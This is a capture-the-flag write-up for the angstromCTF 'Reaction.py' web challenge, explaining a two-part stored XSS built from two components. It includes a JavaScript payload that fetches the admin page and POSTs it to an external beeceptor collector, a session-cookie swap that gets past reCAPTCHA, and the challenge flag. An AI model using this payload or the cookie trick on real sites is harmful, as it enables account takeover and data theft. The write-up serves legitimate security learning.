# Reaction.py

WEB: 150 points

> Jason's created the newest advancement in web development, Reaction.py!
> A server-side component-based web framework. He created a few demo components that you can find on [his site](https://reactionpy.2021.chall.actf.co/login).
> If you make a cool enough webpage, you can submit them to the contest and win prizes!

## Where is Flag?

Flag is stored at `accounts["admin"]["bucket"]` on app server.
A user can choice from 4 type component and push to own `accounts[username]["bucket"]`.
Bucket can store components up to 2.
In `/` of site, you can see user's bucket if you logged in.

## Target

You can submit to the contest to decide the coolest webpage.
`POST /contest` and super user will be visit your website.
Super user can impersonate to any user.
Let's try to take over super user and get admin webpage content to get flag.

## XSS

To control super user, you should to XSS on your webpage with bucket.

### `welcome` Component

```py
if name == "welcome":
    if len(bucket) > 0:
        return (ERR, "Welcomes can only go at the start")
    bucket.append(
        """
        <form action="/newcomp" method="POST">
            <input type="text" name="name" placeholder="component name">
            <input type="text" name="cfg" placeholder="component config">
            <input type="submit" value="create component">
        </form>
        <form action="/reset" method="POST">
            <p>warning: resetting components gets rid of this form for some reason</p>
            <input type="submit" value="reset components">
        </form>
        <form action="/contest" method="POST">
            <div class="g-recaptcha" data-sitekey="{}"></div>
            <input type="submit" value="submit site to contest">
        </form>
        <p>Welcome <strong>{}</strong>!</p>
        """.format(
            captcha.get("sitekey"), escape(cfg)
        ).strip()
    )
```

`welcome` Component render contest form.
Google re-captcha is required to submit to the contest.
This component can only be added when the bucket is empty.

`escape` is one of the function provided by `Flask`.
> Convert the characters `&`, `<`, `>`, `‘`, and `”` in string s to HTML-safe sequences.
> Use this if you need to display text that might contain such characters in HTML. Marks return value as markup string.
Ref. [flask.escape — Flask API](https://tedboy.github.io/flask/generated/flask.escape.html)

### `char_count` Component

```py
elif name == "char_count":
    bucket.append(
        "<p>{}</p>".format(
            escape(
                f"<strong>{len(cfg)}</strong> characters and <strong>{len(cfg.split())}</strong> words"
            )
        )
    )
```

You can inject only numbers with `char_count` Component.

### `text` Component

```py
elif name == "text":
    bucket.append("<p>{}</p>".format(escape(cfg)))
```

You can inject some text with `text` Component, but it will be convert to HTML-safe strings.

### `freq` Component

```py
elif name == "freq":
    counts = Counter(cfg)
    (char, freq) = max(counts.items(), key=lambda x: x[1])
    bucket.append(
        "<p>All letters: {}<br>Most frequent: '{}'x{}</p>".format(
            "".join(counts), char, freq
        )
    )
```

You can inject some text with `freq` Component, and it will be not escaped!
Duplicate characters in `cfg` are eliminated: `"abacbd"` -> `"abcd"`

### Inject Script Tag

Use `freq` Component to inject script tag.
`"<script>"` string has no duplicate characters.
To ignore after strings of `<script>` tag, treat the trailing string as a comment: `"<script> /*"`

### Inject Script

`text` Component can inject any string that does not include the following 5 types: `&`, `<`, `>`, `‘`, and `”`
So, you can inject any JavaScript source, such as: `"alert(0)"`
To ignore after strings of script you inject, treat the trailing string as a comment: `"alert(0) \\"`
And you ware success to embed arbitrary JavaScript in your webpage. 😎

### How to steal flag?

If you can submit your polluted webpage, super user will be visit and arbitrary JavaScript will be executed.

Scenario to steal the flag:

1. Super user visit your webpage, and execute JavaScript.
2. Get content of admin webpage.
3. Send content to your website (ex. [beeceptor.com](http://beeceptor.com))

Super user can get webpage content with `GET /?fakeuser=<username>`.
You cannot use single-quote, double-quote and `=>`, use back-quote and `function(...args) {}`.

```js
fetch(`/?fakeuser=admin`)
  .then(function(r){return r.text()})
  .then(function(body){fetch(`https://progfay.free.beeceptor.com`,{method:`POST`,body})})
```

## Wait, can you submit your webpage to the contest?

To submit, required to Google re-captcha and this form is rendered by `welcome` Component.
You already `freq` and `text` Components and reached the limit of bucket size.

You can bypass Google re-captcha with another user's submit form.

1. Create second user and go to `/`.
2. Replace `session` value in Cookie to first user.
3. Submit form with Google re-captcha.

And you got admin webpage content on beeceptor Console.

Flag: `actf{two_part_xss_is_double_the_parts_of_one_part_xss}`
